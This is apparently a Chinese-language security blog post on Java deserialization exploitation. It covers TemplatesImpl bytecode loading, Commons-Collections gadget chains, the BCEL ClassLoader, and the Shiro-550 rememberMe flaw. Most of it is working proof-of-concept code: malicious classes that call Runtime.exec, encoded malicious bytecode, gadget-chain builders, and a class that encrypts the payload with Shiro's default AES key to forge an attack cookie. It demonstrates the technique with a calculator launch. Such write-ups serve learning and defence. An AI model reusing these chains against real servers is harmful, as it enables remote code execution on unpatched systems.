---
title: "java_TemplatesImpl在BCEL和shiro中的利用"
onlyTitle: true
date: 2022-10-07 13:05:36
categories:
- java
- CC
tags:
- Shiro
- BCEL
- CC
img: https://typora-202017030217.oss-cn-beijing.aliyuncs.com/%E5%9B%BE%E7%89%87%E7%B4%A0%E6%9D%90/1080P%20A%20%E6%94%B6%E8%97%8F%E9%87%8F%E6%9C%80%E5%A4%9A/1080PA%E5%A3%81%E7%BA%B810.png
---

URLClassLoader可以从远程HTTP服务器上加载.class文件，从而执行任意代码。

# JAVA Classloader

字节码的本质是一个字节数组byte[]

## defineClass

加载class或者jar文件，都会经过ClassLoader加载器的loadClass本地寻找类,findClass远程加载类，defineClass处理字节码，从而变成真正的java类。

因为defineClass被调用时，类对象不会被初始化，只有被显式调用构造函数时才能初始化。而且defineClass是protect类型，所以使用反射

```java
Method defineClass = ClassLoader.class.getDeclaredMethod("defineClass", String.class, byte[].class, int.class, int.class);
defineClass.setAccessible(true);
```



## TemplateSImpl

> 依赖：
>
> ```java
> <dependency>
>             <groupId>org.apache.commons</groupId>
>             <artifactId>commons-collections4</artifactId>
>             <version>4.0</version>
>         </dependency>
> ```

defineClass作用域不开放，所以一般不直接使用。但有一些例外，比如TemplateSImpl。(类方法很少会调用到除public外的方法)，该类的内部类TransletClassLoader重写了defineClass方法

```java
Class defineClass(final byte[] b) {
	return defineClass(null, b, 0, b.length);
}
```

java声明方法默认default，能被外部调用。而调用到TransletClassLoader为下列调用链。

`TemplatesImpl#getOutputProperties() -> TemplatesImpl#newTransformer() ->TemplatesImpl#getTransletInstance() -> TemplatesImpl#defineTransletClasses()-> TransletClassLoader#defineClass()`

使用到defineTransletClasses的其实有`getTransletInstance、getTransletClasses、getTransletIndex`三种，但是getTransletInstance生成的对象会被包含于Transformer

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20221129172318916.png)

最后两个getOutputProperties()和newTransformer都是public类，所以可以略去最后一步直接newTransformer()实现.

```java
ObjectInputStream.GetField gf = is.readFields();
        _name = (String)gf.get("_name", null);
        _bytecodes = (byte[][])gf.get("_bytecodes", null);
        _class = (Class[])gf.get("_class", null);
        _transletIndex = gf.get("_transletIndex", -1);

        _outputProperties = (Properties)gf.get("_outputProperties", null);
        _indentNumber = gf.get("_indentNumber", 0);

        if (is.readBoolean()) {
            _uriResolver = (URIResolver) is.readObject();
        }

        _tfactory = new TransformerFactoryImpl();
```

* 在TemplatesImpl的readObject序列化中可以看到`_name,_bytecodes,_class,_transletIndex,_outputProperties,_indentNumer,_tfactory`都需要设置值进行初始化，但是有些不影响后续利用的不用管，只用设置`_name`为任意字符串，`_bytecode`为恶意字节码数组，`_tfactory.get`为TransformerFactoryImpl对象。

由于是私有属性，需要用到反射`obj.getClass().getDeclaredField()`修改属性值

* 该TemplatesImpl加载的字节码必须为AbstractTranslet子类，因为defineTransletClasses里会对传入类进行一次判断

```java
 	for (int i = 0; i < classCount; i++) {
    _class[i] = loader.defineClass(_bytecodes[i]);
    final Class superClass = _class[i].getSuperclass();

    // Check if this is the main class
    // ABSTRACT_TRANSLET指com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet类
    if (superClass.getName().equals(ABSTRACT_TRANSLET)) {
        _transletIndex = i;
    }
    else {
        _auxClasses.put(_class[i].getName(), _class[i]);
    }

```



所以构造一个特殊类,用来弹计算器

```java
package evil;

import com.sun.org.apache.xalan.internal.xsltc.DOM;
import com.sun.org.apache.xalan.internal.xsltc.TransletException;
import com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;
import com.sun.org.apache.xml.internal.dtm.DTMAxisIterator;
import com.sun.org.apache.xml.internal.serializer.SerializationHandler;

public class EvilTemplatesImpl extends AbstractTranslet {
    public void transform(DOM document, SerializationHandler[] handlers) throws TransletException {}

    public void transform(DOM document, DTMAxisIterator iterator, SerializationHandler handler) throws TransletException {}

    public EvilTemplatesImpl() throws Exception {
        super();
        System.out.println("Hello TemplatesImpl");
        Runtime.getRuntime().exec("calc.exe");
    }
}
```



使用extends继承AbstractTranslet类可以用super显式调用父类构造方法，super()即是指定无参构造函数。

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20221129212417331.png)



![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20221130131858524.png)

完整POC：

```java
package org.example;

import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;
import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;
import org.apache.commons.codec.binary.Base64;

import java.lang.reflect.Field;

public class HelloTemplatesImpl {
    public static void setFieldValue(Object obj, String fieldName, Object value) throws Exception {
        Field field = obj.getClass().getDeclaredField(fieldName);
        field.setAccessible(true);
        field.set(obj, value);
    }

    public static void main(String[] args) throws Exception {
        byte[] code = Base64.decodeBase64("yv66vgAAADQAOgoACQAhCQAiACMIACQKACUAJgoAJwAoCAApCgAnACoHACsHACwBAAl0cmFuc2Zvcm0BAHIoTGNvbS9zdW4vb3JnL2FwYWNoZS94YWxhbi9pbnRlcm5hbC94c2x0Yy9ET007W0xjb20vc3VuL29yZy9hcGFjaGUveG1sL2ludGVybmFsL3NlcmlhbGl6ZXIvU2VyaWFsaXphdGlvbkhhbmRsZXI7KVYBAARDb2RlAQAPTGluZU51bWJlclRhYmxlAQASTG9jYWxWYXJpYWJsZVRhYmxlAQAEdGhpcwEAGExldmlsL0V2aWxUZW1wbGF0ZXNJbXBsOwEACGRvY3VtZW50AQAtTGNvbS9zdW4vb3JnL2FwYWNoZS94YWxhbi9pbnRlcm5hbC94c2x0Yy9ET007AQAIaGFuZGxlcnMBAEJbTGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvc2VyaWFsaXplci9TZXJpYWxpemF0aW9uSGFuZGxlcjsBAApFeGNlcHRpb25zBwAtAQCmKExjb20vc3VuL29yZy9hcGFjaGUveGFsYW4vaW50ZXJuYWwveHNsdGMvRE9NO0xjb20vc3VuL29yZy9hcGFjaGUveG1sL2ludGVybmFsL2R0bS9EVE1BeGlzSXRlcmF0b3I7TGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvc2VyaWFsaXplci9TZXJpYWxpemF0aW9uSGFuZGxlcjspVgEACGl0ZXJhdG9yAQA1TGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvZHRtL0RUTUF4aXNJdGVyYXRvcjsBAAdoYW5kbGVyAQBBTGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvc2VyaWFsaXplci9TZXJpYWxpemF0aW9uSGFuZGxlcjsBAAY8aW5pdD4BAAMoKVYHAC4BAApTb3VyY2VGaWxlAQAWRXZpbFRlbXBsYXRlc0ltcGwuamF2YQwAHAAdBwAvDAAwADEBABNIZWxsbyBUZW1wbGF0ZXNJbXBsBwAyDAAzADQHADUMADYANwEACGNhbGMuZXhlDAA4ADkBABZldmlsL0V2aWxUZW1wbGF0ZXNJbXBsAQBAY29tL3N1bi9vcmcvYXBhY2hlL3hhbGFuL2ludGVybmFsL3hzbHRjL3J1bnRpbWUvQWJzdHJhY3RUcmFuc2xldAEAOWNvbS9zdW4vb3JnL2FwYWNoZS94YWxhbi9pbnRlcm5hbC94c2x0Yy9UcmFuc2xldEV4Y2VwdGlvbgEAE2phdmEvbGFuZy9FeGNlcHRpb24BABBqYXZhL2xhbmcvU3lzdGVtAQADb3V0AQAVTGphdmEvaW8vUHJpbnRTdHJlYW07AQATamF2YS9pby9QcmludFN0cmVhbQEAB3ByaW50bG4BABUoTGphdmEvbGFuZy9TdHJpbmc7KVYBABFqYXZhL2xhbmcvUnVudGltZQEACmdldFJ1bnRpbWUBABUoKUxqYXZhL2xhbmcvUnVudGltZTsBAARleGVjAQAnKExqYXZhL2xhbmcvU3RyaW5nOylMamF2YS9sYW5nL1Byb2Nlc3M7ACEACAAJAAAAAAADAAEACgALAAIADAAAAD8AAAADAAAAAbEAAAACAA0AAAAGAAEAAAAKAA4AAAAgAAMAAAABAA8AEAAAAAAAAQARABIAAQAAAAEAEwAUAAIAFQAAAAQAAQAWAAEACgAXAAIADAAAAEkAAAAEAAAAAbEAAAACAA0AAAAGAAEAAAAMAA4AAAAqAAQAAAABAA8AEAAAAAAAAQARABIAAQAAAAEAGAAZAAIAAAABABoAGwADABUAAAAEAAEAFgABABwAHQACAAwAAABMAAIAAQAAABYqtwABsgACEgO2AAS4AAUSBrYAB1exAAAAAgANAAAAEgAEAAAADwAEABAADAARABUAEgAOAAAADAABAAAAFgAPABAAAAAVAAAABAABAB4AAQAfAAAAAgAg".getBytes());
        TemplatesImpl obj = new TemplatesImpl();
        setFieldValue(obj, "_bytecodes", new byte[][] {code});
        setFieldValue(obj, "_name", "HelloTemplatesImpl");
        setFieldValue(obj, "_tfactory", new TransformerFactoryImpl());

        obj.newTransformer();
    }
}

```

上述src字节码来自EvilTemplatesImpl.java编译的class，然后将内容base64。

这里jdk的版本为8u65+commons-collections4.0

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20221130132739469.png)

## TransformedMap调用TemplatesImpl加载字节码

> 依赖：
>
> ```java
> <dependency>
>             <groupId>commons-collections</groupId>
>             <artifactId>commons-collections</artifactId>
>             <version>3.1</version>
>         </dependency>  
> ```

* CC1是依靠TransformedMap直接执行Runtime实例的exec，那根据以上内容，可以直接执行TemplatesImpl下的newTransformer。

只需要修改ConstantTransformer的对象为TemplatesImpl。InvokerTransforomer执行的方法为newTransformer，由于newTransformer不需要参数，所以参数列表和参数内容null就行了

```java
package org.example;
import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;
import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;
import org.apache.commons.collections.functors.ChainedTransformer;
import org.apache.commons.collections.functors.ConstantTransformer;
import org.apache.commons.collections.functors.InvokerTransformer;
import org.apache.commons.collections.map.TransformedMap;
import org.apache.commons.collections.Transformer;
import java.lang.reflect.Field;
import java.util.Base64;
import java.util.HashMap;
import java.util.Map;
public class CC2TemplatesImpl {
    public static void setFieldValue(Object obj, String fieldName, Object value) throws Exception {
            Field field = obj.getClass().getDeclaredField(fieldName);
            field.setAccessible(true);
            field.set(obj, value);
        }
     public static void main(String[] args) throws Exception {
        // source: bytecodes/HelloTemplateImpl.java
        byte[] code =Base64.getDecoder().decode("yv66vgAAADQAOgoACQAhCQAiACMIACQKACUAJgoAJwAoCAApCgAnACoHACsHACwBAAl0cmFuc2Zvcm0BAHIoTGNvbS9zdW4vb3JnL2FwYWNoZS94YWxhbi9pbnRlcm5hbC94c2x0Yy9ET007W0xjb20vc3VuL29yZy9hcGFjaGUveG1sL2ludGVybmFsL3NlcmlhbGl6ZXIvU2VyaWFsaXphdGlvbkhhbmRsZXI7KVYBAARDb2RlAQAPTGluZU51bWJlclRhYmxlAQASTG9jYWxWYXJpYWJsZVRhYmxlAQAEdGhpcwEAGExldmlsL0V2aWxUZW1wbGF0ZXNJbXBsOwEACGRvY3VtZW50AQAtTGNvbS9zdW4vb3JnL2FwYWNoZS94YWxhbi9pbnRlcm5hbC94c2x0Yy9ET007AQAIaGFuZGxlcnMBAEJbTGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvc2VyaWFsaXplci9TZXJpYWxpemF0aW9uSGFuZGxlcjsBAApFeGNlcHRpb25zBwAtAQCmKExjb20vc3VuL29yZy9hcGFjaGUveGFsYW4vaW50ZXJuYWwveHNsdGMvRE9NO0xjb20vc3VuL29yZy9hcGFjaGUveG1sL2ludGVybmFsL2R0bS9EVE1BeGlzSXRlcmF0b3I7TGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvc2VyaWFsaXplci9TZXJpYWxpemF0aW9uSGFuZGxlcjspVgEACGl0ZXJhdG9yAQA1TGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvZHRtL0RUTUF4aXNJdGVyYXRvcjsBAAdoYW5kbGVyAQBBTGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvc2VyaWFsaXplci9TZXJpYWxpemF0aW9uSGFuZGxlcjsBAAY8aW5pdD4BAAMoKVYHAC4BAApTb3VyY2VGaWxlAQAWRXZpbFRlbXBsYXRlc0ltcGwuamF2YQwAHAAdBwAvDAAwADEBABNIZWxsbyBUZW1wbGF0ZXNJbXBsBwAyDAAzADQHADUMADYANwEACGNhbGMuZXhlDAA4ADkBABZldmlsL0V2aWxUZW1wbGF0ZXNJbXBsAQBAY29tL3N1bi9vcmcvYXBhY2hlL3hhbGFuL2ludGVybmFsL3hzbHRjL3J1bnRpbWUvQWJzdHJhY3RUcmFuc2xldAEAOWNvbS9zdW4vb3JnL2FwYWNoZS94YWxhbi9pbnRlcm5hbC94c2x0Yy9UcmFuc2xldEV4Y2VwdGlvbgEAE2phdmEvbGFuZy9FeGNlcHRpb24BABBqYXZhL2xhbmcvU3lzdGVtAQADb3V0AQAVTGphdmEvaW8vUHJpbnRTdHJlYW07AQATamF2YS9pby9QcmludFN0cmVhbQEAB3ByaW50bG4BABUoTGphdmEvbGFuZy9TdHJpbmc7KVYBABFqYXZhL2xhbmcvUnVudGltZQEACmdldFJ1bnRpbWUBABUoKUxqYXZhL2xhbmcvUnVudGltZTsBAARleGVjAQAnKExqYXZhL2xhbmcvU3RyaW5nOylMamF2YS9sYW5nL1Byb2Nlc3M7ACEACAAJAAAAAAADAAEACgALAAIADAAAAD8AAAADAAAAAbEAAAACAA0AAAAGAAEAAAAKAA4AAAAgAAMAAAABAA8AEAAAAAAAAQARABIAAQAAAAEAEwAUAAIAFQAAAAQAAQAWAAEACgAXAAIADAAAAEkAAAAEAAAAAbEAAAACAA0AAAAGAAEAAAAMAA4AAAAqAAQAAAABAA8AEAAAAAAAAQARABIAAQAAAAEAGAAZAAIAAAABABoAGwADABUAAAAEAAEAFgABABwAHQACAAwAAABMAAIAAQAAABYqtwABsgACEgO2AAS4AAUSBrYAB1exAAAAAgANAAAAEgAEAAAADwAEABAADAARABUAEgAOAAAADAABAAAAFgAPABAAAAAVAAAABAABAB4AAQAfAAAAAgAg");
        TemplatesImpl obj = new TemplatesImpl();
        setFieldValue(obj, "_bytecodes", new byte[][] {code});
        setFieldValue(obj, "_name", "HelloTemplatesImpl");
        setFieldValue(obj, "_tfactory", new TransformerFactoryImpl());
        Transformer[] transformers = new Transformer[]{
            new ConstantTransformer(obj),
            new InvokerTransformer("newTransformer", null, null)
    	};
        Transformer transformerChain = new
        ChainedTransformer(transformers);
        Map innerMap = new HashMap();
        Map outerMap = TransformedMap.decorate(innerMap, null,
        transformerChain);
        outerMap.put("godown", "buruheshen");
    }
}
```

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20221130152023647.png)

## Common-collections3

一般来说都不用InvokerTransformers，因为一个广泛用于java反序列化过滤的工具SerialKiller，它的第一个版本过滤掉了InvokerTransformer，所以有了CC3

* CC3使用` com.sun.org.apache.xalan.internal.xsltc.trax.TrAXFilter`，而且这个类不是像InvokerTransformer一样调用方法，而是直接在构造函数调用了newTransformer()

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20221130192845333.png)

但是之前的CC链调用构造函数可以依赖InvokerTransformer调用transform进行任意函数调用，包括构造函数。（getConstructor反射没有transform接口，前面无法连起来)

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20221130194653361.png)

可以用InstantiateTransformer来调用TrAXFilter构造方法。构造函数的参数就是字节码

```java
Transformer[] transformers = new Transformer[]{
    new ConstantTransformer(TrAXFilter.class),
    new InstantiateTransformer(
    new Class[] { Templates.class },
    new Object[] { obj })
};
```

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20221130203928758.png)



## BCEL ClassLoader

BCEL包的`com.sun.org.apache.bcel.internal.util.ClassLoader`重写了java内置的`ClassLoader#loadClass()`方法。BCEL包的ClassLoader会判断类名是否为`$$BCEL$$`开头，如果是，会对字符串进行解码（算法细节看源码）

可以通过BCEL提供的Repository将一个class转换成原生字节码（也能直接编译），再用Utility将原生字节码转换成BCEL格式字节码

### BCEL弹计算器

先写一个恶意类BCELEvil：

```java
package evil;

public class BCELEvil {
            static {
                try {
                    Runtime.getRuntime().exec("calc.exe");
                } catch (Exception e) {}
            }
        }

```

然后将BCELEvil.java转换成BCEL字节码

```java
package evil;
import com.sun.org.apache.bcel.internal.classfile.JavaClass;
import com.sun.org.apache.bcel.internal.classfile.Utility;
import com.sun.org.apache.bcel.internal.Repository;
public class BCELencode {
    public static void main(String []args) throws Exception {
        JavaClass cls = Repository.lookupClass(evil.BCELEvil.class);
        String code = Utility.encode(cls.getBytes(), true);
        System.out.println(code);
    }
}
```

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20221130141306148.png)

验证是否成功执行字节码：（注意ClassLoader.loadClass是负责加载类的，字符串需要用newInstance()实例化）

```java
package evil;

import com.sun.org.apache.bcel.internal.classfile.JavaClass;
import com.sun.org.apache.bcel.internal.classfile.Utility;
import com.sun.org.apache.bcel.internal.Repository;
import com.sun.org.apache.bcel.internal.util.ClassLoader;
public class BCELdecode {
    public static void main(String []args) throws Exception {
        new ClassLoader().loadClass("$$BCEL$$"+"$l$8b$I$A$A$A$A$A$A$AeP$cbN$c30$Q$i$b7$a1IC$d2B$cb$fb$cd$89$c2$81$5c$b8$Vq$a0$w$X$c2C$U$95$b3k$acb$I$JJ$5d$c4$lq$ee$F$Q$H$3e$80$8fB$acC$81$o$oy$c7$3b$de$99$b1$f3$fe$f1$fa$G$60$H$eb$$lL$b9$98$c6$8c$83Y$83s6$e6m$y$d8Xd$u$ec$aaX$e9$3d$86$7cm$b3$cd$605$92K$c9P$OU$y$8f$fb$b7$j$99$9e$f3NDL$rL$E$8f$da$3cU$a6$l$92$96$beR$3d3$z$efU$U$ec7$9aa$936u$GgWDC_$bf$a5$b9$b89$e2w$99$86$92$Z$dcV$d2O$85$3cP$c6$c3$ff$96m_$f3$7b$ee$c1A$d1$c6$92$87e$ac$90$Pe$8am$f9$m$3d$acb$8d$a1jf$82$88$c7$dd$a0$f9$m$e4$9dVIL$W$7f$e2$Z$s$7e$a7N$3a$d7Rh$86$c9_$ea$ac$lkuK$c9nW$ea$9ff$ba$b6$Z$fe$9b$a1$97X$U$$$Y6j$p$a7$z$9d$aa$b8$5b$l$V$9c$a6$89$90$bd$5e$j$eb$u$d0$ef6_$O$cc$3c$86$aaK$5d$40$c8$I$c7$b6$9e$c1$G$d9$f18$d5BF$e6$e1Q$f5$be$G$e0$a3D$e8$a0$fc$p$3e$cc$cc$80$d2$Lr$95$fc$T$ac$8bGX$87$83$8c$x$92n$8c$i$8c$5b$89$d0x$W$e9$K$3e9xY$O0A$cbF$$$b41$J$SU2$ba$fa$JOO$ad$8b$o$C$A$A").newInstance();
    }
}
```

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20221130142334254.png)



## shiro反序列化

由于前面几种CC都有一定的限制，比如CC1用到exec需要为Runtime下的方法，而且不同的利用方式对应了不同的利用链。但是TemplatesImpl可以执行任意java代码

* 原理：shiro为了让浏览器保存登录状态，将保持登录的信息序列化并加密后保存在Cookie的rememberMe字段，在读取时反序列化。但在shiro 1.2.4版本前加密key固定

靶机：https://github.com/phith0n/JavaThings/blob/master/shirodemo

对java项目进行打包：右侧maven->生命周期->clean->complie->package 就可以看到有输出包

配置到tomcat上：下载tomcat后安装（不用配环境变量）->IDEA里运行->编辑配置->应用程序服务器指向tomcat文件->部署里添加已打包的包->确定后运行

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20221204135854142.png)

正确的账号密码为 root secret

在登录时选中`Remember me`服务器会返回一个set-cookie作为客户端cookie

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20221204135939822.png)

攻击方式：用 **shiro加密cookie的key** 加密payload，放到cookie中进行攻击

该靶机key的值为：`kPH+bIxk5D2deZiIxcaaaA==`的base64解码（默认密钥）。加密方式为aes

漏洞特征为：登录页面响应包有rememberMe=deleteMe。Cookie中有rememberM字段

检测工具：`https://github.com/feihong-cs/ShiroExploit`

> shiro无法利用CC1,6。因为shiro的ClassResolvingObjectInputStream重写了resolveClass(查找类的方法)，而resolveClass使用到的forName和原生的Class.forName不一样。导致反序列化流不能包含非java自身的数组，CC1,6都使用了Transformer数组

在上一篇的CC6(`https://xz.aliyun.com/t/11861`)中，反序列化链为：`java.util.HashMap#readObject()` 到`HashMap#hash()`到`TiedMapEntry#hashCode()`到`TiedMapEntry#getValue()`到`LazyMap.get()`(get不到值的时候触发)到`transformer()`。transformer调用ConstantTransformer和InvokerTransformer进行命令执行

CC6的POC：

```java
package org.example;
import org.apache.commons.collections.Transformer;
import org.apache.commons.collections.functors.ChainedTransformer;
import org.apache.commons.collections.functors.ConstantTransformer;
import org.apache.commons.collections.functors.InvokerTransformer;
import org.apache.commons.collections.map.LazyMap;
import java.io.ByteArrayInputStream;
import java.io.ByteArrayOutputStream;
import java.io.ObjectInputStream;
import java.io.ObjectOutputStream;
import org.apache.commons.collections.keyvalue.TiedMapEntry;
import java.util.HashMap;
import java.util.Map;
import java.lang.reflect.Field;
public class CommonCollections6 {
    public static void main(String[] args) throws Exception {
        Transformer[] fakeTransformers = new Transformer[] {new ConstantTransformer(1)};
        Transformer[] transformers = new Transformer[] {
                new ConstantTransformer(Runtime.class),
                new InvokerTransformer("getMethod", new Class[] { String.class,Class[].class }, new Object[] { "getRuntime",new Class[0] }),
                new InvokerTransformer("invoke", new Class[] { Object.class,Object[].class }, new Object[] { null, new Object[0] }),
                new InvokerTransformer("exec", new Class[] { String.class },
                new String[] {"calc.exe" }),
        };
        Transformer transformerChain = new ChainedTransformer(fakeTransformers);//先绑定假transform
        Map innerMap = new HashMap();
        Map outerMap = LazyMap.decorate(innerMap, transformerChain);

        TiedMapEntry tme = new TiedMapEntry(outerMap, "keykey");
        Map expMap = new HashMap();
        expMap.put(tme, "valuevalue");
        outerMap.remove("keykey");
        Field f = ChainedTransformer.class.getDeclaredField("iTransformers");
        f.setAccessible(true);
        f.set(transformerChain, transformers);

        ByteArrayOutputStream barr = new ByteArrayOutputStream();
        ObjectOutputStream oos = new ObjectOutputStream(barr);
        oos.writeObject(expMap);
        oos.close();

        ObjectInputStream ois = new ObjectInputStream(new
                ByteArrayInputStream(barr.toByteArray()));
        Object o = (Object)ois.readObject();
    }
}
```

可以看到依旧用了Transformer[]数组，因为需要用到chainedTransformer。为了舍弃chainedTransformer就必须舍弃ConstantTransformer(初始化恶意对象)和InvokerTransformer的其中一个。

为了触发TiedMapEntry#hashcode()，在实例化TiedMapEntry时传入了LazyMap对象。在构造TiedMapEntry时，第二个参数都是随便填的（无论value是否为"keykey"都会使`map.containsKey(key)==ture`，只要有值)

```java
TiedMapEntry tme = new TiedMapEntry(outerMap, "keykey");
```

`LazyMap#get()`时会把key传到transformer[]->InvokerTransformer->transform()

所以在创建tme时，把key的值改为TemplatesImpl恶意对象就行了



POC:

```java
package org.example;

import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;
import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;
import org.apache.commons.collections.Transformer;
import org.apache.commons.collections.functors.InvokerTransformer;
import org.apache.commons.collections.keyvalue.TiedMapEntry;
import org.apache.commons.collections.map.LazyMap;

import java.io.ByteArrayOutputStream;
import java.io.ObjectOutputStream;
import java.lang.reflect.Field;
import java.util.HashMap;
import java.util.Map;

public class CommonsCollectionsShiro {
    public static void setFieldValue(Object obj, String fieldName, Object value) throws Exception {
        Field field = obj.getClass().getDeclaredField(fieldName);
        field.setAccessible(true);
        field.set(obj, value);
    }

    public byte[] getPayload(byte[] clazzBytes) throws Exception {
        byte[] code =Base64.getDecoder().decode("yv66vgAAADQAOgoACQAhCQAiACMIACQKACUAJgoAJwAoCAApCgAnACoHACsHACwBAAl0cmFuc2Zvcm0BAHIoTGNvbS9zdW4vb3JnL2FwYWNoZS94YWxhbi9pbnRlcm5hbC94c2x0Yy9ET007W0xjb20vc3VuL29yZy9hcGFjaGUveG1sL2ludGVybmFsL3NlcmlhbGl6ZXIvU2VyaWFsaXphdGlvbkhhbmRsZXI7KVYBAARDb2RlAQAPTGluZU51bWJlclRhYmxlAQASTG9jYWxWYXJpYWJsZVRhYmxlAQAEdGhpcwEAGExldmlsL0V2aWxUZW1wbGF0ZXNJbXBsOwEACGRvY3VtZW50AQAtTGNvbS9zdW4vb3JnL2FwYWNoZS94YWxhbi9pbnRlcm5hbC94c2x0Yy9ET007AQAIaGFuZGxlcnMBAEJbTGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvc2VyaWFsaXplci9TZXJpYWxpemF0aW9uSGFuZGxlcjsBAApFeGNlcHRpb25zBwAtAQCmKExjb20vc3VuL29yZy9hcGFjaGUveGFsYW4vaW50ZXJuYWwveHNsdGMvRE9NO0xjb20vc3VuL29yZy9hcGFjaGUveG1sL2ludGVybmFsL2R0bS9EVE1BeGlzSXRlcmF0b3I7TGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvc2VyaWFsaXplci9TZXJpYWxpemF0aW9uSGFuZGxlcjspVgEACGl0ZXJhdG9yAQA1TGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvZHRtL0RUTUF4aXNJdGVyYXRvcjsBAAdoYW5kbGVyAQBBTGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvc2VyaWFsaXplci9TZXJpYWxpemF0aW9uSGFuZGxlcjsBAAY8aW5pdD4BAAMoKVYHAC4BAApTb3VyY2VGaWxlAQAWRXZpbFRlbXBsYXRlc0ltcGwuamF2YQwAHAAdBwAvDAAwADEBABNIZWxsbyBUZW1wbGF0ZXNJbXBsBwAyDAAzADQHADUMADYANwEACGNhbGMuZXhlDAA4ADkBABZldmlsL0V2aWxUZW1wbGF0ZXNJbXBsAQBAY29tL3N1bi9vcmcvYXBhY2hlL3hhbGFuL2ludGVybmFsL3hzbHRjL3J1bnRpbWUvQWJzdHJhY3RUcmFuc2xldAEAOWNvbS9zdW4vb3JnL2FwYWNoZS94YWxhbi9pbnRlcm5hbC94c2x0Yy9UcmFuc2xldEV4Y2VwdGlvbgEAE2phdmEvbGFuZy9FeGNlcHRpb24BABBqYXZhL2xhbmcvU3lzdGVtAQADb3V0AQAVTGphdmEvaW8vUHJpbnRTdHJlYW07AQATamF2YS9pby9QcmludFN0cmVhbQEAB3ByaW50bG4BABUoTGphdmEvbGFuZy9TdHJpbmc7KVYBABFqYXZhL2xhbmcvUnVudGltZQEACmdldFJ1bnRpbWUBABUoKUxqYXZhL2xhbmcvUnVudGltZTsBAARleGVjAQAnKExqYXZhL2xhbmcvU3RyaW5nOylMamF2YS9sYW5nL1Byb2Nlc3M7ACEACAAJAAAAAAADAAEACgALAAIADAAAAD8AAAADAAAAAbEAAAACAA0AAAAGAAEAAAAKAA4AAAAgAAMAAAABAA8AEAAAAAAAAQARABIAAQAAAAEAEwAUAAIAFQAAAAQAAQAWAAEACgAXAAIADAAAAEkAAAAEAAAAAbEAAAACAA0AAAAGAAEAAAAMAA4AAAAqAAQAAAABAA8AEAAAAAAAAQARABIAAQAAAAEAGAAZAAIAAAABABoAGwADABUAAAAEAAEAFgABABwAHQACAAwAAABMAAIAAQAAABYqtwABsgACEgO2AAS4AAUSBrYAB1exAAAAAgANAAAAEgAEAAAADwAEABAADAARABUAEgAOAAAADAABAAAAFgAPABAAAAAVAAAABAABAB4AAQAfAAAAAgAg");
        TemplatesImpl obj = new TemplatesImpl();
        setFieldValue(obj, "_bytecodes", new byte[][]{code});
        setFieldValue(obj, "_name", "godown");
        setFieldValue(obj, "_tfactory", new TransformerFactoryImpl());

        Transformer transformer = new InvokerTransformer("getClass", null, null);//避免调试中多次调用LazyMap，随便先放个类

        Map innerMap = new HashMap();
        Map outerMap = LazyMap.decorate(innerMap, transformer);

        TiedMapEntry tme = new TiedMapEntry(outerMap, obj);

        Map expMap = new HashMap();
        expMap.put(tme, "valuevalue");

        outerMap.clear();//作用等同outerMap.remove()
        setFieldValue(transformer, "iMethodName", "newTransformer");//替换为反序列化链入口

        // ==================
        // 生成序列化字符串
        ByteArrayOutputStream barr = new ByteArrayOutputStream();
        ObjectOutputStream oos = new ObjectOutputStream(barr);
        oos.writeObject(expMap);
        oos.close();

        return barr.toByteArray();
    }
}
```

用到Clientattack类把上面的payload用密钥进行加密。

javassist库加载TemplatesImpl编译的字节码，然后base64解密的密钥进行aes加密

```java
package org.example;

import javassist.ClassPool;
import javassist.CtClass;
import org.apache.shiro.crypto.AesCipherService;
import org.apache.shiro.util.ByteSource;
public class Clientattack {
    public static void main(String []args) throws Exception {
        ClassPool pool = ClassPool.getDefault();
        CtClass clazz =
                pool.get(org.example.CommonsCollectionsShiro.class.getName());
        byte[] payloads = new
                CommonsCollectionsShiro().getPayload(clazz.toBytecode());
        AesCipherService aes = new AesCipherService();
        byte[] key =
                java.util.Base64.getDecoder().decode("kPH+bIxk5D2deZiIxcaaaA==");
        ByteSource ciphertext = aes.encrypt(payloads, key);
        System.out.printf(ciphertext.toString());
    }
}
```

需要用到javassist库，下载到本地项目结构里直接添加

`https://www.javassist.org/`

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20221204181850284.png)

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20221204181959799.png)

这个反序列化链可以用来检测shiro-550
